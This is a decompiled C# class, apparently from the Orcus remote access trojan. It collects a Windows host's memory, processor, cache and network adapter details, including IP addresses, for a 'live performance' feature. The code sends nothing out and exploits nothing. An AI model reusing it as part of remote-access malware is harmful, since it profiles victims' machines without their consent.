using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Orcus.Native;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Utilities;

namespace Orcus.Commands.LivePerformance;

internal class StaticPerformance
{
	public static StaticPerformanceData GetStaticPerformanceData()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0018: Expected O, but got Unknown
		StaticPerformanceData val = new StaticPerformanceData();
		SetMemoryInformation(val);
		SetProcessorInformation(val);
		SetEthernetInformation(val);
		return val;
	}

	private static void SetMemoryInformation(StaticPerformanceData data)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemory");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			List<uint> list = (from managementObject in ((IEnumerable)val2).OfType<ManagementObject>()
				select (managementObject == null) ? null : ((ManagementBaseObject)managementObject).get_Item("Speed") into speed
				where speed != null
				select speed).Cast<uint>().ToList();
			if (list.Count > 0)
			{
				data.set_MemorySpeed(list.OrderBy((uint x) => x).First());
			}
			data.set_UsedMemorySlots(val2.get_Count());
			MEMORYSTATUSEX mEMORYSTATUSEX = new MEMORYSTATUSEX();
			if (NativeMethods.GlobalMemoryStatusEx(mEMORYSTATUSEX))
			{
				data.set_TotalMemory(mEMORYSTATUSEX.ullTotalPhys);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		ManagementObjectSearcher val3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemoryArray");
		try
		{
			ManagementObject val4 = ((IEnumerable)val3.Get()).OfType<ManagementObject>().FirstOrDefault();
			if (val4 != null)
			{
				data.set_TotalMemorySlots((ushort)((ManagementBaseObject)val4).get_Item("MemoryDevices"));
			}
		}
		finally
		{
			((IDisposable)val3)?.Dispose();
		}
	}

	private static void SetProcessorInformation(StaticPerformanceData data)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("Win32_Processor");
		try
		{
			ManagementObject val2 = ((IEnumerable)val.GetInstances()).OfType<ManagementObject>().FirstOrDefault();
			if (val2 != null)
			{
				data.set_MaxClockSpeed(val2.TryGetProperty<uint>("MaxClockSpeed"));
				data.set_ProcessorName(val2.TryGetProperty<string>("Name"));
				data.set_Cores(val2.TryGetProperty<uint>("NumberOfCores"));
				data.set_LogicalProcessors(val2.TryGetProperty<uint>("NumberOfLogicalProcessors"));
				if (!CoreHelper.RunningOnVistaOrGreater)
				{
					return;
				}
				ManagementClass val3 = new ManagementClass("Win32_CacheMemory");
				try
				{
					data.set_L1Cache((uint)(from x in ((IEnumerable)val3.GetInstances()).OfType<ManagementObject>()
						where x.TryGetProperty<ushort>("Level") == 4
						select x).Sum((ManagementObject x) => x.TryGetProperty<uint>("MaxCacheSize")));
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
				data.set_L2Cache(val2.TryGetProperty<uint>("L2CacheSize"));
				data.set_L3Cache(val2.TryGetProperty<uint>("L3CacheSize"));
			}
			else
			{
				data.set_MaxClockSpeed(0u);
				data.set_ProcessorName("N/A");
				data.set_Cores(0u);
				data.set_LogicalProcessors(0u);
				data.set_L1Cache(0u);
				data.set_L2Cache(0u);
				data.set_L3Cache(0u);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static void SetEthernetInformation(StaticPerformanceData data)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		data.set_EthernetAdapters(new List<EthernetAdapter>());
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Wireless80211 && networkInterface.NetworkInterfaceType != NetworkInterfaceType.Ethernet)
			{
				continue;
			}
			IPInterfaceProperties iPProperties = networkInterface.GetIPProperties();
			EthernetAdapter val = new EthernetAdapter();
			val.set_AdapterName(networkInterface.Name);
			val.set_Description(networkInterface.Description);
			val.set_ConnectionType(networkInterface.NetworkInterfaceType.ToString());
			val.set_DnsName(iPProperties.DnsSuffix);
			EthernetAdapter val2 = val;
			foreach (UnicastIPAddressInformation unicastAddress in iPProperties.UnicastAddresses)
			{
				if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && val2.get_Ipv4Address() == null)
				{
					val2.set_Ipv4Address(unicastAddress.Address.ToString());
				}
				else if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetworkV6 && val2.get_Ipv6Address() == null)
				{
					val2.set_Ipv6Address(unicastAddress.Address.ToString());
				}
			}
			data.get_EthernetAdapters().Add(val2);
		}
	}
}
